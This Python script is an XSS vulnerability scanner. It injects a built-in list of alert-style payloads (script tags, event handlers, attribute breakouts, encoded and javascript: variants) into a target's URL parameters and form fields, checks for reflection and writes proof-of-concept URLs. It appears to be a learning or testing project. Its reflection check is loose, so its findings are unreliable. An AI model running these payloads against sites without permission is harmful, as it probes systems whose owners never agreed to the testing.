#!/usr/bin/env python3
"""
Cross-Site Scripting (XSS) Vulnerability Scanner
Project #7: XSS Detection Tool
"""

import requests
import sys
import time
import re
import html
import urllib.parse
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
import argparse

# Color codes for terminal output
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    MAGENTA = '\033[95m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

class XSSScanner:
    def __init__(self, target, payloads=None, timeout=5, delay=0.5,
                 output_file="xss_results.txt", verbose=False, threads=10):
        """
        Initialize the XSS Scanner
        """
        self.target = target
        self.timeout = timeout
        self.delay = delay
        self.output_file = output_file
        self.verbose = verbose
        self.threads = threads
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        })
        
        # XSS payloads by category
        self.payloads = payloads or {
            'basic': [
                {'payload': '<script>alert("XSS")</script>', 'type': 'basic', 'description': 'Basic script alert'},
                {'payload': '<script>alert(1)</script>', 'type': 'basic', 'description': 'Basic script alert (numeric)'},
                {'payload': '<script>alert(document.cookie)</script>', 'type': 'basic', 'description': 'Cookie stealer'},
            ],
            'event': [
                {'payload': '<img src=x onerror=alert(1)>', 'type': 'event', 'description': 'Image onerror event'},
                {'payload': '<img src="x" onerror="alert(1)">', 'type': 'event', 'description': 'Image onerror with quotes'},
                {'payload': '<body onload=alert(1)>', 'type': 'event', 'description': 'Body onload event'},
                {'payload': '<svg/onload=alert(1)>', 'type': 'event', 'description': 'SVG onload event'},
                {'payload': '<input onfocus=alert(1) autofocus>', 'type': 'event', 'description': 'Input onfocus event'},
            ],
            'attribute': [
                {'payload': '"><script>alert(1)</script>', 'type': 'attribute', 'description': 'Close attribute, open script'},
                {'payload': '"><img src=x onerror=alert(1)>', 'type': 'attribute', 'description': 'Close attribute, image onerror'},
                {'payload': '"><svg/onload=alert(1)>', 'type': 'attribute', 'description': 'Close attribute, SVG onload'},
                {'payload': '" onmouseover=alert(1) "', 'type': 'attribute', 'description': 'Mouseover event in attribute'},
                {'payload': '" onerror=alert(1) "', 'type': 'attribute', 'description': 'Error event in attribute'},
            ],
            'encoded': [
                {'payload': '%3Cscript%3Ealert(1)%3C/script%3E', 'type': 'encoded', 'description': 'URL encoded script'},
                {'payload': '&#60;script&#62;alert(1)&#60;/script&#62;', 'type': 'encoded', 'description': 'HTML encoded script'},
                {'payload': '\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E', 'type': 'encoded', 'description': 'Hex encoded script'},
            ],
            'polyglot': [
                {'payload': 'javascript:alert(1)', 'type': 'polyglot', 'description': 'JavaScript protocol'},
                {'payload': 'jaVasCript:alert(1)', 'type': 'polyglot', 'description': 'Case-insensitive JavaScript'},
                {'payload': '"><script>alert(1)//<', 'type': 'polyglot', 'description': 'Polyglot XSS'},
            ]
        }
        
        # XSS detection patterns
        self.xss_indicators = [
            r'<script',
            r'alert\(',
            r'onerror=',
            r'onload=',
            r'onmouseover=',
            r'onfocus=',
            r'<img',
            r'<svg',
            r'<body',
            r'<input',
            r'javascript:',
            r'&#60;',
            r'%3C',
        ]
        
        self.results = []
        self.vulnerabilities = []
        self.baseline_response = None
    
    def test_connection(self):
        """Test if target is reachable"""
        print(f"{Colors.BOLD}[*] Testing connection to {self.target}...{Colors.RESET}")
        
        try:
            response = self.session.get(
                self.target,
                timeout=5,
                verify=False,
                allow_redirects=True
            )
            
            print(f"{Colors.GREEN}[✓] Target is reachable! Status: {response.status_code}{Colors.RESET}")
            return True
            
        except Exception as e:
            print(f"{Colors.RED}[!] Cannot reach {self.target}: {str(e)[:50]}{Colors.RESET}")
            return False
    
    def get_parameters_from_url(self, url):
        """Extract GET parameters from URL"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return {k: v[0] if v else '' for k, v in params.items()}
    
    def parse_forms(self, html):
        """Parse HTML forms and extract parameters"""
        soup = BeautifulSoup(html, 'html.parser')
        forms = []
        
        for form in soup.find_all('form'):
            form_data = {
                'action': form.get('action', ''),
                'method': form.get('method', 'get').lower(),
                'inputs': []
            }
            
            for input_tag in form.find_all('input'):
                input_data = {
                    'name': input_tag.get('name', ''),
                    'type': input_tag.get('type', 'text'),
                    'value': input_tag.get('value', '')
                }
                if input_data['name']:
                    form_data['inputs'].append(input_data)
            
            for textarea in form.find_all('textarea'):
                input_data = {
                    'name': textarea.get('name', ''),
                    'type': 'textarea',
                    'value': ''
                }
                if input_data['name']:
                    form_data['inputs'].append(input_data)
            
            if form_data['inputs']:
                forms.append(form_data)
        
        return forms
    
    def build_url(self, base_url, params):
        """Build URL with parameters"""
        parsed = urlparse(base_url)
        encoded_params = urlencode(params)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, encoded_params, parsed.fragment))
    
    def detect_xss_in_response(self, response_text, payload, context='html'):
        """Check if payload is reflected in the response"""
        if not response_text:
            return False
        
        # For encoded payloads, check decoded version too
        payloads_to_check = [payload]
        if '%' in payload:
            try:
                decoded = urllib.parse.unquote(payload)
                payloads_to_check.append(decoded)
            except:
                pass
        
        for p in payloads_to_check:
            # Check if payload appears in response (exact match or partial)
            if p in response_text:
                return True
            
            # Check if parts of payload appear (for context detection)
            if '<script' in p and '<script' in response_text:
                return True
            
            if 'alert(' in p and 'alert(' in response_text:
                return True
        
        return False
    
    def detect_context(self, response_text, payload):
        """Detect where the payload is reflected (HTML, attribute, JavaScript)"""
        contexts = []
        
        if not response_text:
            return ['unknown']
        
        # Check for HTML context
        if re.search(r'<[^>]*' + re.escape(payload[:20]) + r'[^>]*>', response_text, re.IGNORECASE):
            contexts.append('html')
        
        # Check for attribute context
        if re.search(r'=\s*["\']' + re.escape(payload[:20]), response_text, re.IGNORECASE):
            contexts.append('attribute')
        
        # Check for JavaScript context
        if re.search(r'<script[^>]*>.*' + re.escape(payload[:20]) + r'.*</script>', response_text, re.IGNORECASE | re.DOTALL):
            contexts.append('javascript')
        
        # Check if it appears as plain text
        if payload in response_text:
            contexts.append('plain')
        
        # If payload appears, but no specific context detected
        if not contexts and self.detect_xss_in_response(response_text, payload):
            contexts.append('unknown')
        
        return contexts if contexts else ['not reflected']
    
    def get_risk_level(self, context, payload_type):
        """Calculate risk level based on context and payload type"""
        if context == 'javascript':
            return 'HIGH'
        elif context in ['html', 'attribute']:
            return 'HIGH'
        elif context == 'plain':
            return 'MEDIUM'
        elif payload_type == 'basic':
            return 'HIGH'
        elif payload_type in ['event', 'attribute']:
            return 'HIGH'
        elif payload_type == 'encoded':
            return 'MEDIUM'
        else:
            return 'LOW'
    
    def generate_poc(self, url, parameter, payload, method='GET'):
        """Generate a proof-of-concept URL"""
        if method.upper() == 'GET':
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            params[parameter] = [payload]
            new_query = urlencode(params, doseq=True)
            poc = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
            return poc
        else:
            return f"POST {url} with parameter {parameter}={payload}"
    
    def test_payloads(self, url, param_name, param_value, method='GET', form_data=None):
        """Test all payloads on a parameter"""
        results = []
        
        # Flatten payloads from categories
        all_payloads = []
        for category, payloads in self.payloads.items():
            for payload in payloads:
                payload['category'] = category
                all_payloads.append(payload)
        
        print(f"{Colors.BOLD}[*] Testing {len(all_payloads)} payloads on parameter: {param_name}{Colors.RESET}")
        
        for payload_data in all_payloads:
            payload = payload_data['payload']
            payload_type = payload_data.get('type', 'unknown')
            category = payload_data.get('category', 'unknown')
            
            if self.delay > 0:
                time.sleep(self.delay)
            
            try:
                # Build test parameters
                test_params = {param_name: payload}
                
                # For GET requests
                if method.upper() == 'GET':
                    test_url = self.build_url(url, {param_name: param_value + payload})
                    response = self.session.get(
                        test_url,
                        timeout=self.timeout,
                        verify=False,
                        allow_redirects=True
                    )
                else:
                    # For POST requests
                    if form_data:
                        test_data = form_data.copy()
                        test_data[param_name] = param_value + payload
                        response = self.session.post(
                            url,
                            data=test_data,
                            timeout=self.timeout,
                            verify=False,
                            allow_redirects=True
                        )
                    else:
                        test_data = {param_name: param_value + payload}
                        response = self.session.post(
                            url,
                            data=test_data,
                            timeout=self.timeout,
                            verify=False,
                            allow_redirects=True
                        )
                
                # Check if payload is reflected
                if self.detect_xss_in_response(response.text, payload):
                    # Detect context
                    contexts = self.detect_context(response.text, payload)
                    context = contexts[0] if contexts else 'unknown'
                    
                    risk = self.get_risk_level(context, payload_type)
                    
                    vulnerability = {
                        'url': url,
                        'parameter': param_name,
                        'method': method.upper(),
                        'payload': payload,
                        'payload_type': payload_type,
                        'category': category,
                        'description': payload_data.get('description', ''),
                        'context': context,
                        'contexts': contexts,
                        'risk': risk,
                        'response_length': len(response.text),
                        'poc': self.generate_poc(url, param_name, payload, method)
                    }
                    
                    results.append(vulnerability)
                    
                    # Print result
                    if risk == 'HIGH':
                        risk_color = Colors.RED
                    elif risk == 'MEDIUM':
                        risk_color = Colors.YELLOW
                    else:
                        risk_color = Colors.CYAN
                    
                    print(f"  {Colors.RED}[✓] VULNERABLE!{Colors.RESET} Payload: {payload[:50]}")
                    print(f"    Context: {context}")
                    print(f"    Risk: {risk_color}{risk}{Colors.RESET}")
                    print(f"    PoC: {vulnerability['poc'][:100]}...")
                    print("")
                    
                elif self.verbose:
                    print(f"  {Colors.YELLOW}[-] Not reflected: {payload[:30]}{Colors.RESET}")
                    
            except Exception as e:
                if self.verbose:
                    print(f"  {Colors.YELLOW}[!] Error testing {payload[:30]}: {str(e)[:30]}{Colors.RESET}")
        
        return results
    
    def scan_parameters(self, url, params, method='GET', form_data=None):
        """Scan all parameters"""
        all_results = []
        
        for param_name, param_value in params.items():
            if not param_name:
                continue
            
            print(f"\n{Colors.BOLD}{Colors.BLUE}[*] Testing parameter: {param_name} ({method}){Colors.RESET}")
            print(f"  Value: {param_value}")
            
            param_results = self.test_payloads(url, param_name, param_value, method, form_data)
            
            if param_results:
                all_results.extend(param_results)
                self.vulnerabilities.extend(param_results)
        
        return all_results
    
    def scan(self):
        """Main scan method"""
        print("\n" + "=" * 70)
        print(f"{Colors.BOLD}{Colors.MAGENTA}[*] XSS Vulnerability Scanner{Colors.RESET}")
        print("=" * 70)
        print(f"{Colors.BOLD}[*] Target: {self.target}{Colors.RESET}")
        
        # Count total payloads
        total_payloads = sum(len(p) for p in self.payloads.values())
        print(f"{Colors.BOLD}[*] Payloads: {total_payloads} in {len(self.payloads)} categories{Colors.RESET}")
        print(f"{Colors.BOLD}[*] Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.RESET}")
        print("")
        
        # Test connection
        if not self.test_connection():
            print(f"{Colors.RED}[!] Cannot proceed with scan - target unreachable{Colors.RESET}")
            return
        
        start_time = time.time()
        
        # Parse target URL
        parsed_url = urlparse(self.target)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        # Check for GET parameters
        params = self.get_parameters_from_url(self.target)
        
        if params:
            print(f"{Colors.CYAN}[*] Found {len(params)} GET parameters{Colors.RESET}")
            self.scan_parameters(self.target, params, 'GET')
        else:
            print(f"{Colors.YELLOW}[!] No GET parameters found. Looking for forms...{Colors.RESET}")
            
            try:
                response = self.session.get(base_url, timeout=self.timeout, verify=False)
                forms = self.parse_forms(response.text)
                
                if forms:
                    print(f"{Colors.CYAN}[*] Found {len(forms)} form(s){Colors.RESET}")
                    for form_idx, form in enumerate(forms, 1):
                        form_action = form.get('action', '')
                        form_method = form.get('method', 'get')
                        
                        if form_action.startswith('http'):
                            form_url = form_action
                        else:
                            form_url = base_url + form_action
                        
                        print(f"\n{Colors.BOLD}{Colors.CYAN}[*] Form #{form_idx}: {form_url} ({form_method}){Colors.RESET}")
                        
                        # Extract form parameters
                        form_params = {}
                        for input_data in form.get('inputs', []):
                            if input_data.get('name'):
                                form_params[input_data['name']] = input_data.get('value', '')
                        
                        if form_params:
                            if form_method.upper() == 'POST':
                                self.scan_parameters(form_url, form_params, 'POST', form_params)
                            else:
                                self.scan_parameters(form_url, form_params, 'GET')
                else:
                    print(f"{Colors.YELLOW}[!] No forms found. Try a URL with parameters.{Colors.RESET}")
            except Exception as e:
                print(f"{Colors.RED}[!] Error parsing forms: {str(e)[:50]}{Colors.RESET}")
        
        self.scan_time = time.time() - start_time
        self.generate_report()
    
    def generate_report(self):
        """Generate a detailed report"""
        print("\n" + "=" * 70)
        print(f"{Colors.BOLD}{Colors.GREEN}[✓] SCAN COMPLETE{Colors.RESET}")
        print("=" * 70)
        print(f"{Colors.BOLD}[*] Duration: {self.scan_time:.2f} seconds{Colors.RESET}")
        print(f"{Colors.BOLD}[*] Total Vulnerabilities: {len(self.vulnerabilities)}{Colors.RESET}")
        
        if self.vulnerabilities:
            print(f"\n{Colors.BOLD}{Colors.RED}[⚠️] XSS VULNERABILITIES FOUND:{Colors.RESET}")
            print("-" * 50)
            
            # Group by URL
            vuln_by_url = {}
            for vuln in self.vulnerabilities:
                url = vuln.get('url', 'unknown')
                if url not in vuln_by_url:
                    vuln_by_url[url] = []
                vuln_by_url[url].append(vuln)
            
            for url, vulns in vuln_by_url.items():
                print(f"\n{Colors.BOLD}{Colors.CYAN}Target: {url}{Colors.RESET}")
                for vuln in vulns:
                    param = vuln.get('parameter', 'unknown')
                    method = vuln.get('method', 'GET')
                    payload = vuln.get('payload', '')
                    context = vuln.get('context', 'unknown')
                    risk = vuln.get('risk', 'LOW')
                    poc = vuln.get('poc', '')
                    
                    risk_color = Colors.RED if risk == 'HIGH' else Colors.YELLOW if risk == 'MEDIUM' else Colors.CYAN
                    
                    print(f"  {Colors.RED}[+] Parameter: {param} ({method}){Colors.RESET}")
                    print(f"    Payload: {payload}")
                    print(f"    Context: {context}")
                    print(f"    Risk: {risk_color}{risk}{Colors.RESET}")
                    print(f"    PoC: {poc}")
                    print("")
        else:
            print(f"\n{Colors.GREEN}[✓] No XSS vulnerabilities found!{Colors.RESET}")
            print(f"\n{Colors.YELLOW}[!] Note: The target may not be vulnerable or may require different payloads.{Colors.RESET}")
        
        # Save report
        self.save_report()
        
        # Show summary
        if self.vulnerabilities:
            print(f"\n{Colors.BOLD}{Colors.RED}[📋] XSS VULNERABILITY SUMMARY:{Colors.RESET}")
            
            # By context
            contexts = {}
            for vuln in self.vulnerabilities:
                context = vuln.get('context', 'unknown')
                contexts[context] = contexts.get(context, 0) + 1
            
            print("  By Context:")
            for context, count in contexts.items():
                print(f"    {context}: {count}")
            
            # By risk
            risks = {}
            for vuln in self.vulnerabilities:
                risk = vuln.get('risk', 'LOW')
                risks[risk] = risks.get(risk, 0) + 1
            
            print("  By Risk:")
            for risk, count in sorted(risks.items()):
                color = Colors.RED if risk == 'HIGH' else Colors.YELLOW if risk == 'MEDIUM' else Colors.CYAN
                print(f"    {color}{risk}{Colors.RESET}: {count}")
        
        print("\n" + "=" * 70)
        print(f"{Colors.GREEN}[✓] Results saved to: {self.output_file}{Colors.RESET}")
        print("=" * 70)
    
    def save_report(self):
        """Save report to file"""
        with open(self.output_file, 'w', encoding='utf-8') as f:
            f.write("=" * 80 + "\n")
            f.write("XSS VULNERABILITY SCAN REPORT\n")
            f.write("=" * 80 + "\n")
            f.write(f"Target:         {self.target}\n")
            f.write(f"Scan Started:   {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            if hasattr(self, 'scan_time'):
                f.write(f"Scan Duration:  {self.scan_time:.2f} seconds\n")
            f.write(f"Total Vulnerabilities: {len(self.vulnerabilities)}\n")
            f.write("=" * 80 + "\n\n")
            
            if self.vulnerabilities:
                f.write("XSS VULNERABILITIES FOUND\n")
                f.write("-" * 50 + "\n")
                
                for idx, vuln in enumerate(self.vulnerabilities, 1):
                    f.write(f"\nVulnerability #{idx}\n")
                    f.write(f"  URL: {vuln.get('url', 'N/A')}\n")
                    f.write(f"  Parameter: {vuln.get('parameter', 'N/A')}\n")
                    f.write(f"  Method: {vuln.get('method', 'GET')}\n")
                    f.write(f"  Payload: {vuln.get('payload', 'N/A')}\n")
                    f.write(f"  Payload Type: {vuln.get('payload_type', 'N/A')}\n")
                    f.write(f"  Category: {vuln.get('category', 'N/A')}\n")
                    f.write(f"  Context: {vuln.get('context', 'N/A')}\n")
                    f.write(f"  Risk: {vuln.get('risk', 'LOW')}\n")
                    f.write(f"  PoC: {vuln.get('poc', 'N/A')}\n")
                    f.write(f"  Description: {vuln.get('description', 'N/A')}\n")
            else:
                f.write("No XSS vulnerabilities found.\n")
            
            f.write("\n" + "=" * 80 + "\n")
            f.write("Report generated by XSS Vulnerability Scanner\n")
            f.write("Project #7: XSS Detection Tool\n")
            f.write("=" * 80 + "\n")
    
    def run(self):
        """Main execution method"""
        try:
            self.scan()
        except KeyboardInterrupt:
            print(f"\n{Colors.RED}[!] Scan interrupted by user{Colors.RESET}")
            self.generate_report()
            sys.exit(0)
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
            import traceback
            traceback.print_exc()
            sys.exit(1)

def load_payloads_from_file(filename):
    """Load custom payloads from file"""
    payloads = {
        'custom': []
    }
    
    try:
        with open(filename, 'r') as f:
            for line in f:
                line = line.strip()
                if line:
                    # Parse format: "payload|type|description"
                    if '|' in line:
                        parts = line.split('|')
                        payload = parts[0]
                        ptype = parts[1] if len(parts) > 1 else 'custom'
                        description = parts[2] if len(parts) > 2 else 'Custom payload'
                        payloads['custom'].append({
                            'payload': payload,
                            'type': ptype,
                            'description': description
                        })
                    else:
                        payloads['custom'].append({
                            'payload': line,
                            'type': 'custom',
                            'description': 'Custom payload'
                        })
        return payloads
    except Exception as e:
        print(f"{Colors.RED}[!] Error loading payloads: {e}{Colors.RESET}")
        return None

def main():
    parser = argparse.ArgumentParser(
        description="XSS Vulnerability Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Scan a URL with GET parameters
  python xss_scanner.py "http://testphp.vulnweb.com/search.php?search=test"
  
  # Scan with custom payloads
  python xss_scanner.py "http://testphp.vulnweb.com/search.php" -p payloads.txt
  
  # Scan a form
  python xss_scanner.py "http://testphp.vulnweb.com/login.php"
  
  # Verbose mode
  python xss_scanner.py "http://testphp.vulnweb.com/search.php" -v
        """
    )
    
    parser.add_argument('target', help='Target URL (e.g., http://example.com/page.php?param=1)')
    parser.add_argument('-p', '--payloads', help='File containing custom payloads (format: payload|type|description)')
    parser.add_argument('-t', '--timeout', type=int, default=5, help='Request timeout in seconds (default: 5)')
    parser.add_argument('--delay', type=float, default=0.5, help='Delay between requests in seconds (default: 0.5)')
    parser.add_argument('-o', '--output', default='xss_results.txt', help='Output file name')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    parser.add_argument('--threads', type=int, default=10, help='Number of threads (default: 10)')
    
    args = parser.parse_args()
    
    # Display banner
    print(f"{Colors.CYAN}{Colors.BOLD}" + "=" * 70)
    print("    CROSS-SITE SCRIPTING (XSS) VULNERABILITY SCANNER")
    print("    Project #7: XSS Detection Tool")
    print("=" * 70 + f"{Colors.RESET}\n")
    
    # Load custom payloads if provided
    payloads = None
    if args.payloads:
        payloads = load_payloads_from_file(args.payloads)
        if not payloads:
            print(f"{Colors.YELLOW}[!] Using default payloads{Colors.RESET}")
    
    # Create and run scanner
    scanner = XSSScanner(
        target=args.target,
        payloads=payloads,
        timeout=args.timeout,
        delay=args.delay,
        output_file=args.output,
        verbose=args.verbose,
        threads=args.threads
    )
    
    scanner.run()

if __name__ == "__main__":
    # Suppress SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()